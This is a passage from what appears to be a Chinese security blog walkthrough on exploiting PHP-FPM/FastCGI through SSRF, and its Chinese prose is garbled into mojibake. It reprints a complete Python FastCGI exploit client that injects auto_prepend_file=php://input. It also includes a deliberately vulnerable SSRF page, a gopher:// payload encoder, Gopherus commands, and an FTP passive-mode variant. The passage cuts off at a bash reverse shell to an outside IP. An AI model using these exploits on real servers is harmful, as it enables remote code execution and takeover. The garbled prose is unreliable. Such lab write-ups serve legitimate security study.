#åœ¨æ‰§è¡Œphpæ–‡ä»¶å‰è‡ªåŠ¨åŒ…å«ä¸€ä¸ªæŒ‡å®šæ–‡ä»¶ æˆ‘ä»¬é”å®šç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦‚æœæˆ‘ä»¬å°†å…¶è®¾ç½®ä¸ºphp://inputï¼Œé‚£å°±ç­‰äºåœ¨æ‰§è¡ŒæŒ‡å®šphpæ–‡ä»¶ä¹‹å‰å…ˆæ‰§è¡Œä¸€æ¬¡inputæŒ‡å®šçš„postçš„å†…å®¹ï¼Œå› æ­¤æˆ‘ä»¬å°†æ¶æ„ä»£ç æ”¾å…¥bodyä¸­å³å¯è®©å…¶æ‰§è¡Œæˆ‘ä»¬çš„æ¶æ„ä»£ç ï¼ˆå½“ç„¶ï¼Œè¿˜éœ€è¦å¼€å¯è¿œç¨‹æ–‡ä»¶åŒ…å«é€‰é¡¹allow_url_includeï¼‰ é‚£ä¹ˆï¼Œæˆ‘ä»¬æ€ä¹ˆè®¾ç½®auto_prepend_fileçš„å€¼ï¼Ÿ è¿™åˆæ¶‰åŠåˆ°PHP-FPMçš„ä¸¤ä¸ªç¯å¢ƒå˜é‡ï¼ŒPHP_VALUEå’ŒPHP_ADMIN_VALUEã€‚è¿™ä¸¤ä¸ªç¯å¢ƒå˜é‡å°±æ˜¯ç”¨æ¥è®¾ç½®PHPé…ç½®é¡¹çš„ï¼ŒPHP_VALUEå¯ä»¥è®¾ç½®æ¨¡å¼ä¸ºPHP_INI_USERå’ŒPHP_INI_ALLçš„é€‰é¡¹ï¼ŒPHP_ADMIN_VALUEå¯ä»¥è®¾ç½®æ‰€æœ‰é€‰é¡¹ã€‚ï¼ˆdisable_functionsé™¤å¤–ï¼Œè¿™ä¸ªé€‰é¡¹æ˜¯PHPåŠ è½½çš„æ—¶å€™å°±ç¡®å®šäº†ï¼Œåœ¨èŒƒå›´å†…çš„å‡½æ•°ä¸ä¼šç›´æ¥è¢«åŠ è½½åˆ°PHPä¸Šä¸‹æ–‡ä¸­ï¼‰ æ‰€ä»¥ï¼Œæˆ‘ä»¬æœ€åä¼ å…¥å¦‚ä¸‹ç¯å¢ƒå˜é‡ï¼š { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'GET', 'SCRIPT_FILENAME': '/var/www/html/index.php', 'SCRIPT_NAME': '/index.php', 'QUERY_STRING': '?a=1&amp;b=2', 'REQUEST_URI': '/index.php?a=1&amp;b=2', 'DOCUMENT_ROOT': '/var/www/html', 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '12345', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1' 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' } è®¾ç½®auto_prepend_file = php://inputä¸”allow_url_include = Onï¼Œç„¶åå°†æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„ä»£ç æ”¾åœ¨Bodyä¸­ï¼Œå³å¯æ‰§è¡Œä»»æ„ä»£ç ã€‚ 0x03 ç¯å¢ƒæ­å»º æœ‰äº†ä¸Šé¢å¯¹äºè¿™ä¸ªæ¼æ´çš„ç†è§£ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥æ­å»ºä¸€ä¸‹ç¯å¢ƒæ¥å¤ç°ä¸€æ³¢ï¼Œæ–‡ç« å‚è€ƒï¼šSSRFç³»åˆ—ä¹‹æ”»å‡»FastCGI é¶ æœº: Ubuntu æ”»å‡»æœº: Kali è¿™é‡Œç›´æ¥åœ¨Ubuntuä¸Šå®‰è£…Nginxå’Œphp-fpmï¼Œé¦–å…ˆå®‰è£…Nginx sudo apt-get install nginx å®‰è£…phpã€php-fpmä»¥åŠä¸€äº›æ’ä»¶ sudo apt-get install software-properties-common python-software-properties sudo add-apt-repository ppa:ondrej/php #è¿™é‡Œå®¹æ˜“å¡æ­»,è§£å†³æ–¹æ³•ä½¿ç”¨ä»£ç† sudo apt-get update sudo apt-get -y install php7.2 sudo -y apt-get install php7.2-fpm php7.2-mysql php7.2-curl php7.2-json php7.2-mbstring php7.2 ä¸Šé¢è¿™äº”æ¡å‘½ä»¤ï¼Œå¦‚æœå‰é¢ä¸¤ä¸ªå‡ºé”™ï¼Œåº”è¯¥æ˜¯ä¸ç”¨åœ¨ä¹çš„ï¼ˆäº²èº«ç»å†ï¼‰ é…ç½®php-fpm è¿™é‡ŒèŠ±äº†ä¸€å¤©çš„æ—¶é—´æ‰æˆåŠŸé…ç½®å¥½ã€‚ã€‚ã€‚ã€‚ ä¿®æ”¹é…ç½®ç›‘å¬9000ç«¯å£æ¥å¤„ç†nginxçš„è¯·æ±‚ æ‰“å¼€/etc/php/7.2/fpm/pool.d/www.confæ–‡ä»¶æ‰¾åˆ°å¦‚ä¸‹ä½ç½®æ³¨é‡Šç¬¬ä¸€è¡Œæ·»åŠ ç¬¬äºŒè¡Œ ;listen = /run/php/php7.2-fpm.sock listen = 127.0.0.1:9000 æ³¨æ„è¿™é‡Œå¦‚æœè®¾ç½®ç›‘å¬ä¸º0.0.0.0:9000å°±åœ¨äº§ç”Ÿphp-fpmæœªæˆæƒè®¿é—®æ¼æ´ï¼Œæ­¤æ—¶æ”»å‡»è€…å¯ä»¥ç›´æ¥ä¸9000ç«¯å£ä¸Šçš„php-fpmè¿›è¡Œé€šä¿¡ï¼Œè¿›è€Œå¯ä»¥å®ç°ä»»æ„ä»£ç æ‰§è¡Œã€‚ ä¸‹é¢ä¿®æ”¹æƒé™ chmod 777 /run/php/php7.2-fpm.sock æ‰“å¼€nginxçš„é…ç½®æ–‡ä»¶ /etc/nginx/sites-available/default ä¿®æ”¹ç›¸åº”éƒ¨åˆ†çš„é…ç½® è¿™é‡Œåœ¨ä½ç½®1ï¼Œä¿®æ”¹ä¸€ä¸‹nginxçš„æ ¹ç›®å½•ä½ç½®ï¼Œæœ€å¥½åˆ«æ/var/www/htmlï¼Œè¿™æ ·ä¼¼ä¹æ˜¯ä¸ubuntuè‡ªå¸¦çš„Apache2æœåŠ¡å†²çªï¼ˆå¦‚æœæ²¡æœ‰apache2å½“æˆ‘æ²¡è¯´ï¼‰ï¼Œéšååœ¨ä½ç½®2æ·»åŠ index.phpï¼Œä½ç½®3ä¸­server_name èµ‹å€¼ä¸ºlocalhostã€‚æœ€ååœ¨å…¶ä¸‹é¢åˆé€‚ä½ç½®æ·»åŠ å¦‚ä¸‹ä»£ç å³å¯ location ~\\.php$ { try_files $uri = 404; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi_params; } ä¿å­˜æ–‡ä»¶ï¼Œä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ å¯åŠ¨ç¯å¢ƒ è¿™é‡Œå…ˆå¯åŠ¨nginxæœåŠ¡ï¼Œå®ŒæˆåæŸ¥çœ‹ä¸€ä¸‹php-fpmçš„å®‰è£…ä½ç½®ï¼Œç„¶åå¯åŠ¨ï¼šservice php7.2-fpm start whereis php-fpm /usr/sbin/php-fpm7.2 #è¿™æ˜¯æˆ‘çš„é¶æœºä¸Šphp-fpmå®‰è£…çš„ä½ç½® é‡æ–°å¯åŠ¨Nginx sudo systemctl restart nginx ç„¶åæ£€æŸ¥nginxæ˜¯å¦æ­£ç¡®å¯åŠ¨ systemctl status nginx æ£€æŸ¥php-fpmæ˜¯å¦æ­£ç¡®å¯åŠ¨ ps -elf | grep php-fpm è¿™é‡Œå°±å¯ä»¥çœ‹å‡ºä¸Šé¢æ‰€è¯´çš„å­˜åœ¨ä¸€ä¸ªmasterè¿›ç¨‹å’Œå¤šä¸ªworkerè¿›ç¨‹ ä¸‹é¢å°†/usr/share/nginx/htmlç›®å½•ä¸‹çš„æ–‡ä»¶åˆ é™¤ï¼Œæ–°å»ºä¸€ä¸ªindex.phpï¼Œå†…å®¹å¯ä»¥å†™ä¸Š&lt;?php phpinfo();?&gt; ç”¨æ¥æ£€æŸ¥å„é¡¹æ˜¯å¦æ­£å¸¸è¿è¡Œï¼Œå¦‚æœé¡µé¢ä¸ºç©ºï¼ŒæŸ¥çœ‹è¿™ç¯‡æ–‡ç« è§£å†³ å…¶ä¸­Sever API å¤„å’Œä¸Šå›¾ä¸€æ ·è¯´æ˜è¿è¡Œæ­£ç¡®ï¼Œç„¶ååœ¨ç›®å½•ä¸‹æ–°å»ºssrf.php å†…å®¹ä¸º &lt;?php highlight_file(__FILE__); $url = $_GET['url']; $curl = curl_init($url); //ç¬¬äºŒç§åˆå§‹åŒ–curlçš„æ–¹å¼ //$curl = curl_init(); curl_setopt($curl, CURLOPT_URL, $_GET['url']); /*è¿›è¡Œcurlé…ç½®*/ curl_setopt($curl, CURLOPT_HEADER, 0); // ä¸è¾“å‡ºHTTPå¤´ $responseText = curl_exec($curl); //var_dump(curl_error($curl) );//å¦‚æœæ‰§è¡Œcurlè¿‡ç¨‹ä¸­å‡ºç°å¼‚å¸¸ï¼Œå¯æ‰“å¼€æ­¤å¼€å…³ï¼Œä»¥ä¾¿æŸ¥çœ‹å¼‚å¸¸å†…å®¹ echo $responseText; curl_close($curl); ?&gt; è¯¥ä»£ç ä¸ºä¸€ä¸ªssrfæ¼æ´çš„ç¤ºä¾‹ä»£ç ï¼Œå¯ä»¥è®¿é—®/ssrf.php?url=http://www.baidu.comè¿›è¡Œæµ‹è¯•ï¼Œä¸‹å›¾ä¸ºæ­£å¸¸çš„ç»“æœ ssrfæ”»å‡»FastCGIæ¼”ç¤º ä½¿ç”¨expæ”»å‡» è¿™é‡Œåœ¨å·²çŸ¥å…¶ä½¿ç”¨äº†php-fpmçš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆä½¿ç”¨expæµ‹è¯•æ˜¯å¦å¯ä»¥ç›´æ¥æ”»å‡»9000ç«¯å£ï¼Œè¿™ä¸ªå·¥å…·ä¸»è¦æ˜¯ç”¨æ¥æ”»å‡»æœªæˆæƒè®¿é—®php-fpmçš„ï¼Œæ‰€ä»¥ä¸€äº›åœ°æ–¹éœ€è¦è‡ªå·±å†™è„šæœ¬è½¬æ¢ä¸€ä¸‹payloadï¼Œä¸‹é¢æ˜¯ä½¿ç”¨æ–¹æ³•ï¼ˆç½‘ä¸Šæœ‰ç”¨goè¯­è¨€å†™çš„ï¼Œè¿™é‡Œæˆ‘é‡‡ç”¨pyçš„ï¼‰ï¼Œè¿™ä¸ªä»£ç ä¼¼ä¹py2ä¸py3å‡å¯æ‰§è¡Œï¼Œä¸è¿‡æˆ‘è¿™é‡Œç›´æ¥ç”¨çš„py3ï¼Œæœªæµ‹è¯•py2 é¡¹ç›®åœ°å€ï¼šhttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 import socket import random import argparse import sys from io import BytesIO # Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client PY2 = True if sys.version_info.major == 2 else False def bchr(i): if PY2: return force_bytes(chr(i)) else: return bytes([i]) def bord(c): if isinstance(c, int): return c else: return ord(c) def force_bytes(s): if isinstance(s, bytes): return s else: return s.encode('utf-8', 'strict') def force_text(s): if issubclass(type(s), str): return s if isinstance(s, bytes): s = str(s, 'utf-8', 'strict') else: s = str(s) return s class FastCGIClient: \"\"\"A Fast-CGI Client for Python\"\"\" # private __FCGI_VERSION = 1 __FCGI_ROLE_RESPONDER = 1 __FCGI_ROLE_AUTHORIZER = 2 __FCGI_ROLE_FILTER = 3 __FCGI_TYPE_BEGIN = 1 __FCGI_TYPE_ABORT = 2 __FCGI_TYPE_END = 3 __FCGI_TYPE_PARAMS = 4 __FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs={}, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:{} port:{}\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input',#è¿™é‡Œæ˜¯å…³é”®å¤„ 'PHP_ADMIN_VALUE': 'allow_url_include = On'# } response = client.request(params, content) å‘½ä»¤æ ¼å¼ï¼špython [è„šæœ¬å] -c [è¦æ‰§è¡Œçš„ä»£ç ] -p [ç«¯å£å·] [ip] [è¦æ‰§è¡Œçš„phpæ–‡ä»¶] å³ï¼špython3 ssrf+FastCGI.py -c \"&lt;?php system('ls');?&gt;\" -p 8888 192.168.246.130 /usr/share/nginx/html/index.php --è¿™é‡Œå®é™…æ˜¯å†™webç›®å½•ï¼Œä½†ç”±äºæˆ‘é…ç½®çš„æ—¶å€™ä¸æ˜¯é»˜è®¤çš„/var/www/htmlï¼Œå› æ­¤è¿™é‡Œä¼šä¸ä¸€æ ·ï¼Œå½“æˆ‘ä»¬åœ¨å®é™…é‡åˆ°çš„è¯ï¼Œä¸€èˆ¬éƒ½æ˜¯åè€…ã€‚ è¿™é‡Œçš„ç”±äºæˆ‘æ˜¯ç”¨kaliç›‘å¬çš„ç«¯å£ï¼Œæ•…æ­¤å†™äº†kaliçš„ipä¸ç›‘å¬ç«¯å£ æ¥ä¸‹æ¥æˆ‘ä»¬å…ˆè¿è¡Œä¸Šè¿°expï¼ŒåŒæ—¶åœ¨kaliå¼€å¯ç›‘å¬ï¼Œè®°å½•æˆ‘ä»¬çš„æ”»å‡»æµé‡ è¿™é‡Œçš„æŠ¥é”™ä¸ç”¨ç†ä¼šï¼Œå¦‚ä¸‹å›¾ï¼Œè¿™é‡ŒæˆåŠŸå°†æµé‡ä¼ åˆ°äº†1.txtï¼Œæ¥ä¸‹æ¥å°†1.txtæ–‡ä»¶ä¸­çš„å†…å®¹è¿›è¡Œurlç¼–ç ï¼ˆ2æ¬¡ï¼‰å› ä¸ºæˆ‘ä»¬è¿™é‡Œæ˜¯åˆ©ç”¨çš„ssrfè¿›è¡Œçš„æ”»å‡» #-*- coding: UTF-8 -*- import urllib.parse file= open('1.txt','rb') payload= file.read() payload= urllib.parse.quote(payload).replace(\"%0A\",\"%0A%0D\") print(\"gopher://127.0.0.1:9000/_\"+urllib.parse.quote(payload)) å°†å¾—åˆ°çš„ç»“æœä¼ å…¥åˆ°urlå‚æ•°ä¸­ï¼Œå¦‚ä¸‹å›¾æˆåŠŸå‘½ä»¤æ‰§è¡Œ è¿™é‡Œçœ‹çš„æ–‡ç« ä¹Ÿæœ‰ä¸€ä¸ªå€¼å¾—æ³¨æ„çš„ç‚¹ï¼Œå°±æ˜¯å¦‚æœæˆ‘ä»¬å¾—çŸ¥å¯¹æ–¹å¼€å¯äº†php-fpmï¼Œæˆ‘ä»¬å¯èƒ½ä¼šç›´æ¥å°è¯•expå»æ”»å‡»ï¼Œä½†å¾€å¾€ä¼šæ²¡æœ‰æ•ˆæœã€‚è¿™æ˜¯å› ä¸ºå°±åƒæˆ‘ä»¬åˆšåˆšçš„é…ç½®è¿‡ç¨‹ä¸€èˆ¬ï¼Œæˆ‘ä»¬è®¾ç½®çš„ç«¯å£ç›‘å¬åªå…è®¸127.0.0.1ï¼Œå› æ­¤å¦‚æœæˆ‘ä»¬ç›´æ¥è¿›è¡Œæ”»å‡»çš„è¯ï¼Œæˆ‘ä»¬çš„ipæ¥æºæ˜¯å…¬ç½‘çš„ï¼Œå› æ­¤ä¸å¯èƒ½æ”»å‡»æˆåŠŸã€‚é‚£å¦‚ä½•æ‰èƒ½å¯ä»¥æ”»å‡»å‘¢ï¼Œæœ‰ä¸¤ç§æƒ…å†µï¼š å¯¹æ–¹åœ¨è¿›è¡ŒæœåŠ¡å™¨é…ç½®çš„æ—¶å€™å°†php-fpmæœåŠ¡çš„9000ç«¯å£æš´éœ²åœ¨äº†å…¬ç½‘ï¼Œé‚£æˆ‘ä»¬ç›´æ¥å°±å¯ä»¥è¿›è¡Œæ”»å‡»äº†ã€‚ å¦‚æœå…¶ä»…ä»…ç›‘å¬127.0.0.1ï¼Œé‚£æˆ‘ä»¬å°±åªèƒ½ç¥ˆç¦è¯¥ç½‘ç«™å­˜åœ¨ssrfå¯ä»¥è®©æˆ‘ä»¬åˆ©ç”¨ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥æ”»å‡»9000ç«¯å£ åˆ©ç”¨ Gopherus æ”»å‡» é¡¹ç›®åœ°å€ï¼šhttps://github.com/tarunkant/Gopherus Gopherus è¿™ä¸ªå·¥å…·ç›¸æ¯”ä¸Šä¸€ä¸ªæ›´åŠ æ–¹ä¾¿ä¸€ä¸‹ï¼Œè¯¥å·¥å…·èƒ½ç”ŸæˆGopheræœ‰æ•ˆè´Ÿè½½ï¼Œç”¨æ¥åˆ©ç”¨SSRFè¿›è¡ŒRCEï¼š æˆ‘ä»¬æµ…æµ…çœ‹ä¸€ä¸‹å…¶expï¼Œå‘ç°ä»–æœ€ç»ˆå¯¹payloadåªè¿›è¡Œäº†ä¸€æ¬¡ç¼–ç ï¼Œå› æ­¤æˆ‘ä»¬å¦‚æœåœ¨ssrfä¸Šè¿›è¡Œæ”»å‡»çš„æ—¶å€™ï¼Œä¸€èˆ¬è¦è¿›è¡Œ2æ¬¡ç¼–ç ã€‚ ä¸‹é¢æˆ‘ä»¬å°±åˆ©ç”¨è¿™ä¸ªå·¥å…·æ¥æ‰§è¡Œå‘½ä»¤ï¼š python2 gopherus.py --exploit fastcgi /var/www/html/index.php # è¿™é‡Œè¾“å…¥çš„æ˜¯ä¸€ä¸ªå·²çŸ¥å­˜åœ¨çš„phpæ–‡ä»¶ id æˆ‘ä»¬å°†å¾—åˆ°çš„ç»“æœåœ¨è¿›è¡Œä¸€æ¬¡urlç¼–ç ï¼Œå¦‚ä¸‹å›¾æˆåŠŸæ‰§è¡Œ æ¥ä¸‹æ¥è¿˜æœ‰å¾ˆå¤šæ”»å‡»æ–¹æ³•ï¼Œæˆ‘ä»¬ç»§ç»­å­¦ä¹ ï¼ FTP+SSRF æ”»å‡» FPM/FastCGI è¿™æ˜¯åœ¨ä¹‹å‰Laravel Debug mode RCEï¼ˆCVE-2021-3129ï¼‰æ¼æ´çš„ä¸€ä¸ªæ€è·¯ã€‚è¯¥æ¼æ´çš„æ ¸å¿ƒå°±æ˜¯ä¼ å…¥ file_get_contents() å’Œ file_put_contents() è¿™ä¸¤ä¸ªå‡½æ•°ä¸­çš„å†…å®¹æ²¡æœ‰ç»è¿‡è¿‡æ»¤ï¼Œä»è€Œå¯ä»¥é€šè¿‡ç²¾å·§çš„æ„é€ è§¦å‘ phar ååºåˆ—åŒ–ï¼Œè¾¾åˆ°RCEçš„æ•ˆæœã€‚ æ¼æ´ä»£ç å¤§è‡´å¯ä»¥ç®€åŒ–ä¸ºå¦‚ä¸‹ä»£ç ï¼š &lt;?php $contents = file_get_contents($_GET['viewFile']); file_put_contents($_GET['viewFile'], $contents); è¿™é‡Œæ˜¯å°†è¯»å–ä¼ å…¥çš„viewFileå‚æ•°æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„æ‰€å¯¹åº”çš„æ–‡ä»¶çš„å†…å®¹ï¼Œä¹‹ååˆé‡æ–°å†™ä¼šé‚£ä¸ªæ–‡ä»¶ã€‚ã€‚ã€‚ã€‚ ç”±äºæˆ‘ä»¬å¯ä»¥è¿è¡Œ file_get_contents() æ¥æŸ¥æ‰¾ä»»ä½•ä¸œè¥¿ï¼Œå› æ­¤ï¼Œå¯ä»¥è¿ç”¨ SSRF å¸¸ç”¨çš„å§¿åŠ¿ï¼Œé€šè¿‡å‘é€HTTPè¯·æ±‚æ¥æ‰«æå¸¸ç”¨ç«¯å£ã€‚å‡è®¾æ­¤æ—¶æˆ‘ä»¬å‘ç°ç›®æ ‡æ­£åœ¨ç›‘å¬ 9000 ç«¯å£ï¼Œåˆ™å¾ˆæœ‰å¯èƒ½ç›®æ ‡ä¸»æœºä¸Šæ­£åœ¨è¿è¡Œç€ PHP-FPMï¼Œæˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥åˆ©ç”¨è¯¥æ¼æ´æ¥æ”»å‡» PHP-FPMã€‚ ä¼—æ‰€å‘¨çŸ¥ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å‘ PHP-FPM å‘é€ä¸€ä¸ªä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®åŒ…ï¼Œå°±å¯ä»¥åœ¨æœºå™¨ä¸Šæ‰§è¡Œä»£ç ã€‚è¿™ç§æŠ€æœ¯ç»å¸¸ä¸gopher://åè®®ç»“åˆä½¿ç”¨ï¼Œcurlæ”¯æŒgopher://åè®®ï¼Œä½†file_get_contentså´ä¸æ”¯æŒã€‚ ä½†å…¶å´æ”¯æŒå…è®¸é€šè¿‡TCPå‘é€äºŒè¿›åˆ¶æ•°æ®åŒ…çš„FTPåè®®ï¼Œæ›´å‡†ç¡®çš„è¯´åº”è¯¥æ˜¯FTPåè®®çš„è¢«åŠ¨æ¨¡å¼ï¼š å¦‚æœä¸€ä¸ªå®¢æˆ·ç«¯è¯•å›¾ä»FTPæœåŠ¡å™¨ä¸Šè¯»å–æˆ–å†™å…¥ä¸€ä¸ªæ–‡ä»¶ï¼ŒæœåŠ¡ç«¯ä¼šé€šçŸ¥å®¢æˆ·ç«¯å°†æ–‡ä»¶çš„å†…å®¹å†™å…¥æˆ–è¯»å–åˆ°ä¸€ä¸ªç”±æœåŠ¡å™¨æŒ‡å®šçš„IPå’Œç«¯å£ä¸Šã€‚è€Œä¸”è¿™é‡Œå¯¹IPå’Œç«¯å£æ²¡æœ‰è¿›è¡Œå¿…è¦çš„é™åˆ¶ã€‚ä¾‹å¦‚ï¼ŒæœåŠ¡å™¨å¯ä»¥å‘Šè¯‰å®¢æˆ·ç«¯è¿æ¥åˆ°è‡ªå·±çš„æŸä¸€ä¸ªç«¯å£ä¸Šï¼Œå¦‚æœå®¢æˆ·ç«¯æ„¿æ„çš„è¯ã€‚ ç°åœ¨ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ä½¿ç”¨ viewFile=ftp://evil-server/file.txt æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š é¦–å…ˆé€šè¿‡ file_get_contents() å‡½æ•°è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶ä¸‹è½½file.txtã€‚ ç„¶åå†é€šè¿‡ file_put_contents() å‡½æ•°è¿æ¥åˆ°æˆ‘ä»¬çš„FTPæœåŠ¡å™¨ï¼Œå¹¶å°†å…¶ä¸Šä¼ å›file.txtã€‚ ç°åœ¨ï¼Œä½ å¯èƒ½å·²ç»çŸ¥é“è¿™æ˜¯æ€ä¹ˆå›äº‹ï¼šæˆ‘ä»¬å°†ä½¿ç”¨ FTP åè®®çš„è¢«åŠ¨æ¨¡å¼è®© file_get_contents() åœ¨æˆ‘ä»¬çš„æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œå½“å®ƒè¯•å›¾ä½¿ç”¨ file_put_contents() æŠŠå®ƒä¸Šä¼ å›å»æ—¶ï¼Œæˆ‘ä»¬å°†å‘Šè¯‰å®ƒæŠŠæ–‡ä»¶å‘é€åˆ° 127.0.0.1:9000ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å°±å¯ä»¥å‘ç›®æ ‡ä¸»æœºæœ¬åœ°çš„ PHP-FPM å‘é€ä¸€ä¸ªä»»æ„çš„æ•°æ®åŒ…ï¼Œä»è€Œæ‰§è¡Œä»£ç ï¼Œé€ æˆSSRFäº†ã€‚ è¿™é‡Œæˆ‘è¿˜æ˜¯æœ‰ç‚¹éš¾ä»¥ç†è§£ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬ç›´æ¥å®æˆ˜æ¥æ„Ÿå—ä¸€ä¸‹ é¦–å…ˆæˆ‘ä»¬å…ˆæ¥ç”Ÿæˆä¸€ä¸‹payloadï¼Œè¿™é‡Œé‡‡ç”¨çš„å‘½ä»¤æ˜¯bashæ¥åå¼¹shell bash -c \"bash -i &gt;&amp; /dev/tcp/124.220.233.26/9999 